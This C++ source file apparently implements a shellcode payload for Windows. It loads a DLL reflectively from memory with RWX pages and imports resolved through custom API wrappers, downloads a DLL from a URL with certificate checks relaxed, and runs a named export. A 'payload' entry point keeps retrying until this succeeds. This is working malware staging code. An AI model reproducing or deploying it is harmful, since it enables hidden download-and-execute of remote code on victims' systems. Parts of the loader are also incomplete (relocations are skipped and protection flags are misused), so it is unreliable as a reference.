#include "include/LoadLibrary.h"
#include "include/WinAPIShellcode.cpp"

/*!
 * \brief
 * Loads A DLL from a string buffer
 * \param [in] buffer
 * The buffer containing a dll data
 * \param [in] length
 * The length of the buffer
 * @returns The address of the loaded dll
 */
HMODULE LoadLibraryFomMem(char *buffer, size_t length)
{
	if(buffer == NULL) return 0;
#if defined(_WIN64)
	size_t headerlen = sizeof(IMAGE_NT_HEADERS64);
#elif defined(_WIN32)
	size_t headerlen = sizeof(IMAGE_NT_HEADERS32);
#endif
  headerlen += sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_DATA_DIRECTORY) * IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
	if(length < headerlen) {
#ifdef DEBUG
		std::cerr << "file too small" << std::endl;
#endif
		return NULL;
	}
	PIMAGE_DOS_HEADER DOS_HEADER = (PIMAGE_DOS_HEADER)buffer;
	if(DOS_HEADER->e_magic != 0x5a4d) {
#ifdef DEBUG
		std::cerr << "not a valid MZ file" << std::endl;
#endif
		return NULL;
	}
#if defined(_WIN64)
	PIMAGE_NT_HEADERS64 NT_HEADERS = (PIMAGE_NT_HEADERS64)&buffer[DOS_HEADER->e_lfanew];
#elif defined(_WIN32)
	PIMAGE_NT_HEADERS32 NT_HEADERS = (PIMAGE_NT_HEADERS32)&buffer[DOS_HEADER->e_lfanew];
#endif
	if(NT_HEADERS->Signature != 0x4550) {
#ifdef DEBUG
		std::cerr << "not a valid PE file" << std::endl;
#endif
		return NULL;
	}
  headerlen += sizeof(IMAGE_DOS_HEADER) - DOS_HEADER->e_lfanew;
  if(length < headerlen + sizeof(IMAGE_SECTION_HEADER) * NT_HEADERS->FileHeader.NumberOfSections) {
#ifdef DEBUG
  		std::cerr << "file truncated 1" << std::endl;
#endif
		  return NULL;
  }
  //Find the executable virtual size
  size_t high = 0, low = -1;
  for(DWORD secnb=0; secnb<NT_HEADERS->FileHeader.NumberOfSections; secnb++) {
      PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)&buffer[headerlen + sizeof(IMAGE_SECTION_HEADER) * secnb];
#ifdef DEBUG
      std::cout << "New section found: "  << section->Name << std::endl;
#endif
	  if (section->Misc.VirtualSize + section->VirtualAddress > high)
		  high = section->Misc.VirtualSize + section->VirtualAddress;
	  if (section->VirtualAddress < low)
		  low = section->VirtualAddress;
		if(length < section->PointerToRawData + section->SizeOfRawData) {
#ifdef DEBUG
		  		std::cerr << "file truncated 2" << std::endl;
#endif
					return NULL;
			}
  }
  void *ImageBase = (void *)MyVirtualAlloc(NULL, high, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (ImageBase == NULL) {
	  return NULL;
  }
  CopyMemory(ImageBase, buffer, headerlen);//IMAGE BASE
  //Copy the data to the image
  for (DWORD secnb = 0; secnb<NT_HEADERS->FileHeader.NumberOfSections; secnb++) {
	  PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)&buffer[headerlen + sizeof(IMAGE_SECTION_HEADER) * secnb];
	  CopyMemory((char *)ImageBase + section->VirtualAddress, &buffer[section->PointerToRawData], section->SizeOfRawData);
  }
  //Restore the IATS
  for (DWORD dllnb = 0;;dllnb++) {
	  PIMAGE_IMPORT_DESCRIPTOR importdescriptor;
	  importdescriptor = PIMAGE_IMPORT_DESCRIPTOR((char *)ImageBase + NT_HEADERS->OptionalHeader.DataDirectory[1].VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR)*dllnb);
	  if (importdescriptor->Name == 0)
		  break;
	  for (DWORD funcnb = 0;; funcnb++) {
		  PMYIMAGE_THUNK_DATA thunk1 = PMYIMAGE_THUNK_DATA((char *)ImageBase + importdescriptor->OriginalFirstThunk + funcnb * sizeof(PMYIMAGE_THUNK_DATA));
		  PMYIMAGE_THUNK_DATA thunk2 = PMYIMAGE_THUNK_DATA((char *)ImageBase + importdescriptor->FirstThunk + funcnb * sizeof(PMYIMAGE_THUNK_DATA));
		  if (thunk1->u1.ForwarderString == 0 || thunk2->u1.AddressOfData == 0) {
			  break;
		  }
		  thunk2->u1.AddressOfData = (ULONGLONG)MyGetProcAddress(MyLoadLibrary((char *)ImageBase + importdescriptor->Name), (char *)ImageBase + thunk1->u1.ForwarderString + 2);
		  if (thunk2->u1.AddressOfData == 0) {
#ifdef DEBUG
			  std::cerr << "failed to load" << (char *)ImageBase + importdescriptor->Name << ":" << (char *)ImageBase + thunk1->u1.ForwarderString + 2 << std::endl;
#endif
				MyVirtualFree(ImageBase, 0, MEM_RELEASE);
			  return NULL;
		  }
	  }
  }
  //parse relocation
  //IMAGE_RELOCATION relocation = IMAGE_RELOCATION((char *)ImageBase + NT_HEADERS->OptionalHeader.DataDirectory[6].VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR)*dllnb);
  //Restore the rights
  for (DWORD secnb = 0; secnb<NT_HEADERS->FileHeader.NumberOfSections; secnb++) {
	  PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)&buffer[headerlen + sizeof(IMAGE_SECTION_HEADER) * secnb];
	  DWORD myoldprotect = 0;
	  MyVirtualProtect(&((char *)ImageBase)[section->VirtualAddress], section->Misc.VirtualSize, section->Characteristics, &myoldprotect);
  }
#ifdef DEBUG
    std::cerr << "SUCCESS" << std::endl;
#endif
	return (HMODULE)ImageBase;
}

/*!
 * \brief
 * Gets the address of an export from a dll loaded by LoadLibraryFomMem
 * \param [in] hModule
 * The value retured by LoadLibraryFomMem
 * \param [in] lpProcName
 The export name
 * @returns The address of the export
 */
FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
{
	if(hModule == NULL)
		return NULL;
	PIMAGE_DOS_HEADER DOS_HEADER = (PIMAGE_DOS_HEADER)hModule;
#if defined(_WIN64)
		PIMAGE_NT_HEADERS64 NT_HEADERS = (PIMAGE_NT_HEADERS64)((char *)hModule + DOS_HEADER->e_lfanew);
#elif defined(_WIN32)
		PIMAGE_NT_HEADERS32 NT_HEADERS = (PIMAGE_NT_HEADERS32)((char *)hModule + DOS_HEADER->e_lfanew);
#endif
	PIMAGE_EXPORT_DIRECTORY exportdir = (PIMAGE_EXPORT_DIRECTORY)((char *)hModule + NT_HEADERS->OptionalHeader.DataDirectory[0].VirtualAddress);
	if(exportdir->AddressOfNames == 0 || exportdir->AddressOfFunctions == 0) {
		return NULL;
	}
	for(DWORD exportnb=0; exportnb < exportdir->NumberOfNames; exportnb++) {
			LPDWORD name = (LPDWORD)((char *)hModule + exportdir->AddressOfNames + sizeof(DWORD) * exportnb);
#ifdef DEBUG
	std::cout << (char *)hModule + name[0] << std::endl;
	std::cout << lpProcName << std::endl;
	std::cout << mystrcmp((char *)hModule + name[0], (char *)lpProcName) << std::endl;
#endif
	if(mystrcmp((char *)hModule + name[0], (char *)lpProcName)) {
				LPDWORD funcaddr = (LPDWORD)((char *)hModule + exportdir->AddressOfFunctions + sizeof(DWORD) * exportnb);
				return (FARPROC)((char *)hModule + funcaddr[0]);
			}
	}
	return NULL;
}

void *ConcatBuffer(void *buffer, size_t bufferlength, void* data, size_t datasize)
{
	//Sanityze input
	void *retval = MyVirtualAlloc(NULL, bufferlength + datasize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(retval == NULL) {
		return NULL;
	}
	CopyMemory(retval, buffer, bufferlength);
	CopyMemory((char *)retval + bufferlength, data, datasize);
	MyVirtualFree(data, 0, MEM_RELEASE);
	return retval;
}
/*!
 * \brief
 * Loads a dll from an url and execute export by name
 * \param [in] url
 * The url of the dll
 * \param [in] functioname
 * The export name
 */
bool DownloadExecDll(char *url, char *functioname)
{
#ifdef DEBUG
	std::cout << "Downloading: " << url << std::endl;
#endif
	char tempbuffer[1024];
	size_t length = 0;
	DWORD retval;
	void *data = MyVirtualAlloc(NULL, sizeof(tempbuffer), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	HINTERNET WEB_CONNECT = MyInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(WEB_CONNECT == NULL) {
#ifdef DEBUG
		std::cerr << "MyInternetOpenA failed: " << GetLastError() << std::endl;
#endif
		MyVirtualFree(data, 0, MEM_RELEASE);
		return FALSE;
	}
	HINTERNET WEB_ADDRESS = MyInternetOpenUrlA(WEB_CONNECT, url, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE, 0);
	if(WEB_ADDRESS == NULL) {
		MyInternetCloseHandle(WEB_CONNECT);
#ifdef DEBUG
		std::cerr << "MyInternetOpenUrlA failed: " << GetLastError() << std::endl;
#endif
		MyVirtualFree(data, 0, MEM_RELEASE);
		return FALSE;
	}
	DWORD counter = 0;
	do {
		if(MyInternetReadFile(WEB_ADDRESS, tempbuffer, sizeof(tempbuffer), &retval) && retval > 0) {
			data = ConcatBuffer(data, length, tempbuffer, retval);
			length += retval;
		} else {
			counter++;
			MySleep(1000);
			if(counter > 10) {
#ifdef DEBUG
				std::cerr << "Connexion broken..." << std::endl;
#endif
				MyVirtualFree(data, 0, MEM_RELEASE);
				return FALSE;
			}
		}
	} while(retval > 0 && data != NULL);
#ifdef DEBUG
	std::cout << length << " bytes retreived" << std::endl;
#endif
	MyInternetCloseHandle(WEB_ADDRESS);
	MyInternetCloseHandle(WEB_CONNECT);
	if(data == NULL) {
#ifdef DEBUG
		std::cerr << "data empty" << std::endl;
#endif
		MyVirtualFree(data, 0, MEM_RELEASE);
		return FALSE;
	}
	typedef void (WINAPI *_hello)(void);
	HMODULE mylib = LoadLibraryFomMem((char *)data, length);
	MyVirtualFree(data, 0, MEM_RELEASE);
#ifdef DEBUG
	std::cout << std::hex << mylib << std::endl;
#endif
	_hello hello = (_hello)GetProcAddressFomMem(mylib, functioname);
	if(hello != NULL) {
		hello();
		return TRUE;
	}
#ifdef DEBUG
	std::cout << "Failed to get proc addres" << std::endl;
#endif
	return FALSE;
}

extern "C" {
void payload(void) {
#if defined(_WIN64)
	char url[] = "https://./build/hello64.dll";
#elif defined(_WIN32)
	char url[] = "file://./build/hello32.dll";
#endif
	char functioname[] = "a";
	while(!DownloadExecDll(url, functioname)) {
#ifdef DEBUG
		std::cerr << "failed to download executable" << std::endl;
#endif
		MySleep(10000);
	}
}
}

#ifdef DEBUG
int main(int argc, char **argv)
{
	payload();
}
#endif
